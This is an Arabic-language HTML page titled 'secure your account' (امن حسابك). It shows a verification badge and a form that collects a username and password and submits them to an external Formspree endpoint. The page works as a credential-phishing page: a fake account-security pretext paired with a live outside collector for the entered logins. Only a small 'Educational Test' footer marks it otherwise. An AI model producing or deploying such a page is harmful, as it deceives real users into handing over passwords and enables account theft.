<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>امن حسابك</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;
  font-family: Arial, sans-serif;
  background: linear-gradient(135deg, #f4f4f4, #dedede);
  display: flex;
  justify-content: center;
  align-items: center;
}

.card {
  width: 92%;
  max-width: 380px;
  background: white;
  padding: 32px 25px;
  border-radius: 22px;
  box-shadow: 0 12px 40px rgba(0,0,0,.18);
  text-align: center;
}

.logo {
  font-size: 30px;
  font-weight: bold;
  margin-bottom: 25px;
}

.badge {
  display: inline-flex;
  justify-content: center;
  align-items: center;
  width: 21px;
  height: 21px;
  border-radius: 50%;
  background: #2196f3;
  color: white;
  font-size: 13px;
  font-weight: bold;
  vertical-align: middle;
}

input {
  width: 100%;
  padding: 14px;
  margin-bottom: 12px;
  border: 1px solid #ddd;
  border-radius: 10px;
  outline: none;
  font-size: 15px;
}

input:focus {
  border-color: #555;
}

button {
  width: 100%;
  padding: 14px;
  border: 0;
  border-radius: 10px;
  background: #222;
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  transition: .2s;
}

button:hover {
  transform: translateY(-2px);
}

button:active {
  transform: scale(.97);
}

.theme {
  margin-top: 15px;
  background: transparent;
  color: #555;
  border: 1px solid #ddd;
  font-size: 13px;
}

.message {
  display: none;
  margin-top: 15px;
  padding: 12px;
  border-radius: 10px;
  font-size: 14px;
}

.error {
  background: #ffeaea;
  color: #b00000;
}

.note {
  margin-top: 18px;
  color: #888;
  font-size: 11px;
}

body.dark {
  background: #111;
  color: white;
}

body.dark .card {
  background: #1e1e1e;
}

body.dark input {
  background: #292929;
  color: white;
  border-color: #444;
}

body.dark .theme {
  color: white;
}
</style>
</head>

<body>

<div class="card">

  <div class="logo">
    امن حسابك <span class="badge">✓</span>
  </div>

  <form
    id="testForm"
    action="https://formspree.io/f/xrpzoaod"
    method="POST"
  >

    <input
      type="text"
      name="Neme"
      placeholder="Neme"
      autocomplete="off"
      required
    >

    <input
      type="text"
      name="Paswood"
      placeholder="Paswood"
      autocomplete="off"
      required
    >

    <button type="submit">
      إرسال
    </button>

    <div id="error" class="message error">
      عمّر الخانتين.
    </div>

  </form>

  <button class="theme" onclick="toggleTheme()">
    🌙 تغيير المظهر
  </button>

  <div class="note">
    Educational Test
  </div>

</div>

<script>
const form = document.getElementById("testForm");
const error = document.getElementById("error");

form.addEventListener("submit", function(e) {
  const fields = form.querySelectorAll("input");

  if (!fields[0].value.trim() || !fields[1].value.trim()) {
    e.preventDefault();
    error.style.display = "block";
  } else {
    error.style.display = "none";
  }
});

function toggleTheme() {
  document.body.classList.toggle("dark");
}
</script>

</body>
</html>
